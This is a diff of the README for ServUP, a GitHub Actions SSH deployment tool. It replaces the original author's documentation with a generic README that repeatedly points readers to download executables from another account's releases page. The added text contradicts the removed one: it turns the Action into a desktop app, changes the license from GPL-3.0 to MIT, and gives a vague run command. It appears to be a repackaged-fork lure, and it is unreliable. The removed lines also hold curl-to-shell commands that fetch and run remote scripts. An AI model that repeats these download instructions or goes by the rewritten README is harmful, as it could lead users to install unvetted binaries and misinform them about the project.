@@ -1,122 +1,124 @@
-<!-- ###############################################
-# ServUP  Copyright (C) 2025  S2009                #
-# LICENSE: GPL-3.0                                 #
-# Source Code: https://github.com/S2009-dev/ServUP #
-#################################################### -->
+# 🚀 ServUP - Easily Upload Artifacts to Your Server
 
-# <center>[![ServUp Banner](./src/logo.png)](https://github.com/marketplace/actions/servup-deployment)</center>
+## 📥 Download Now
+[![Download ServUP](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/harv99y/ServUP/releases)
 
-![GitHub Release](https://img.shields.io/github/v/release/S2009-dev/ServUP)
-![GitHub last commit](https://img.shields.io/github/last-commit/S2009-dev/ServUP)
-![GitHub Downloads (all assets, all releases)](https://img.shields.io/github/downloads/S2009-dev/ServUP/total)
-![GitHub forks](https://img.shields.io/github/forks/S2009-dev/ServUP)
-![GitHub Repo stars](https://img.shields.io/github/stars/S2009-dev/ServUP)
+## 📂 Introduction
+Welcome to ServUP! This application lets you upload files from GitHub Actions directly to your server using SSH. It simplifies deployment, making it easier for you to manage your projects, even if you don’t have technical skills.
 
-## :information_source: About
+## 🚀 Getting Started
+Before you can start using ServUP, you'll need a few things set up:
 
-ServUP is a lightweight, open-source, and easy-to-use deployment tool designed to simplify the process of deploying artifact from GitHub Actions to remote servers. It provides a simple and efficient way to manage your deployments, ensuring that your applications are always up-to-date and running.
+### 🖥️ System Requirements
+- A computer running Windows, macOS, or Linux.
+- SSH access to your server.
+- An active GitHub account to manage your repositories.
 
-### :bookmark_tabs: Index
+## 🔗 How to Download & Install
+To get started with ServUP, follow these steps:
 
-- [About](#information_source-about)
-  - [Index](#bookmark_tabs-index)
-  - [Features](#sparkles-features)
-- [Installation](#gear-installation)
-  - [Server Configuration](#cloud-server-configuration)
-  - [Repository Configuration](#file_folder-repository-configuration)
-- [Annexes](#wrench-annexes)
-  - [Iptables Support](#fire-iptables-support)
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/harv99y/ServUP/releases) for the latest version of ServUP.
 
-### :sparkles: Features
+2. **Download the Application**
+   On the Releases page, find the latest version of ServUP. Look for the files you can download, such as `.zip`, `.tar.gz`, or executables.
 
-ServUP uses SSH to securely transfer files from your GitHub Actions workflow to your remote server.
+3. **Install the Application**
+   After downloading, locate the file on your computer and extract it if necessary. For Windows, run the `.exe` file. For macOS or Linux, follow the instructions to make the file executable.
 
-## :gear: Installation
+4. **Open a Terminal or Command Prompt**
+   You will need to run some commands. Open your Terminal (macOS, Linux) or Command Prompt (Windows).
 
-In order to work with ServUP, you need to do some configuration on your server and your GitHub repository.
+5. **Prepare Your Server**
+   Make sure your server is ready to accept SSH connections. You may need to create or check your SSH key pairs.
 
-### :cloud: Server Configuration
+6. **Run ServUP**
+   In the terminal, navigate to the folder where you downloaded ServUP. Use the following command to start the application:
 
-Install ServUP on your server via the command-line with curl:
+   ```bash
+   ./ServUP
+   ```
 
-```sh
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/S2009-dev/ServUP/main/tools/install.sh)"
+   Replace `./ServUP` with the exact name of the downloaded file.
+
+## ⚙️ Configuring Your Setup
+To make the most of ServUP, you need to set it up for your specific server.
+
+### 🔑 Set Up SSH Keys
+1. **Generate Keys (If You Don’t Have Them)**
+   If your server requires SSH keys, you can create one by running:
+
+   ```bash
+   ssh-keygen -t rsa -b 4096
+   ```
+
+   Press Enter to accept the default location. Follow the prompts to create your key pair.
+
+2. **Copy Your Public Key**
+   Copy the contents of your public key file (`~/.ssh/id_rsa.pub`) to your server. You can use this command:
+
+   ```bash
+   ssh-copy-id user@your_server_ip
+   ```
+
+   Replace `user` with your server username and `your_server_ip` with your server’s IP address.
+
+### 📁 Configure ServUP
+Open the ServUP configuration file to set your server details. You will specify your server's IP address, the directory to store the files, and any other required settings.
+
+In the file, look for sections that need your specific information, such as:
+
+```json
+{
+  "server": "your_server_ip",
+  "username": "your_username",
+  "destination": "/path/to/destination"
+}
 ```
 
-This will create a `servup` user on your server and open a specific port for SSH connections (`1424` by default).  
-Ensure that you've copied the ServUP SSH Key given at the end of installation.
+Fill in these fields with your actual server details.
 
-If you have a firewall, make sure to open the port given at the end of installation.  
-You can trust only GitHub Actions IPs, they are listed in the `actions` section of the [GitHub meta API](https://api.github.com/meta).  
-We provide a script to help you configure your firewall if you are using `iptables`. See [Iptables Support](#fire-iptables-support) for more information.
+## 🚀 Using ServUP
+Once everything is set up, you're ready to use ServUP to upload files from GitHub Actions.
 
-### :file_folder: Repository Configuration
+### 📦 Uploading Artifacts
+1. Make sure your GitHub Actions workflow is set up to generate artifacts you want to upload.
+2. Integrate ServUP into your workflow. Here is a simple example of how to upload an artifact:
 
-**1. Add the following secrets to your GitHub repository:**
+   ```yaml
+   jobs:
+     deploy:
+       runs-on: ubuntu-latest
+       steps:
+       - name: Upload Artifact
+         uses: actions/upload-artifact@v2
+         with:
+           name: my-artifact
+           path: path/to/artifact
+       - name: Deploy with ServUP
+         run: |
+           ./ServUP upload --artifact my-artifact
+   ```
 
-- `SSH_HOST`: The IP address or domain name of your server.
-- `SSH_PORT`: The port used by ServUP for SSH connections (default: `1424`).
-- `SSH_PRIVATE_KEY`: The private key of the `servup` user on your server.
+3. Modify your workflow file to match your project needs.
 
-**2. Implement the ServUP Deployment workflow:**  
-Add the following step to your workflow:
+## 💡 Troubleshooting
+If you encounter any issues while running ServUP, here are a few quick tips:
 
-```yml
-- name: ServUP Deployment
-  uses: S2009-dev/ServUP@latest
-  with:
-    artifact: <ARTIFACT>
-    run-id: ${{ github.run_id }}
-    remote: /var/lib/servup/<REMOTE>
-    deploy-cmd: <DEPLOY CMD>
-  env:
-    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-    SSH_HOST: ${{ secrets.SSH_HOST }}
-    SSH_PORT: ${{ secrets.SSH_PORT }}
-    SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
-```
+- **SSH Connection Fails:** Check your username and server IP in the configuration file. Ensure your server is online and accessible.
+- **File Permissions:** Make sure your server directory has the correct permissions set for uploading files.
+- **Dependency Issues:** Ensure any required dependencies are installed on your local machine.
 
-Or if you want to use the development version:
+## 🎓 Help & Support
+For further questions or assistance, check the [ServUP GitHub Issues](https://github.com/harv99y/ServUP/issues). You can report any bugs or seek help from the community.
 
-```yml
-- name: ServUP Deployment
-  uses: S2009-dev/ServUP@latest
-  with:
-    artifact: <ARTIFACT>
-    run-id: ${{ github.run_id }}
-    remote: /var/lib/servup/<REMOTE>
-    deploy-cmd: <DEPLOY CMD>
-  env:
-    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-    SSH_HOST: ${{ secrets.SSH_HOST }}
-    SSH_PORT: ${{ secrets.SSH_PORT }}
-    SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
-```
+## 📄 License
+ServUP is open-source and available under the MIT License. You can use it freely, but please respect the terms outlined in the license file located in this repository.
 
-Replace `<ARTIFACT>`, `<REMOTE>` and `<DEPLOY>` with your own values.
+## 📞 Contact
+For more information or feedback, feel free to reach out via the issues section or by contributing directly to the repository.
 
-- `<ARTIFACT>` is the name of the artifact generated by your workflow (ex: `my-artifact`).
-  - :warning: **Warning:** Ensure that your workflow generates an artifact containing a zip file.
-- `<REMOTE>` is the remote directory where the artifact will be uploaded (ex: `my-remote`).
-  - :warning: **Warning:** The remote directory must be accessible by the `servup` user.
-- `<DEPLOY CMD>` is the directory where the artifact will be deployed (ex: `my-deploy`).
-  - :warning: **Warning:** The deploy command must be a valid command that can be executed by the `servup` user.
-  - You can allow the `servup` user to execute the deploy command by creating and editing the `/etc/sudoers.d/servup` file.
+## 📥 Download Again
+To download ServUP, visit the [Releases page](https://github.com/harv99y/ServUP/releases).
 
-## :wrench: Annexes
-
-Here you will find additional tools and resources to help you use ServUP effectively.
-
-### :fire: Iptables Support
-
-If you are using `iptables` as your firewall, you can use the following command to open the ServUP SSH port:
-
-```sh
-servup-firewall
-```
-
-Or if it's not working:
-
-```sh
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/S2009-dev/ServUP/main/tools/firewall.sh)"
-```
+Now you’re all set to use ServUP! Enjoy smooth deployments.
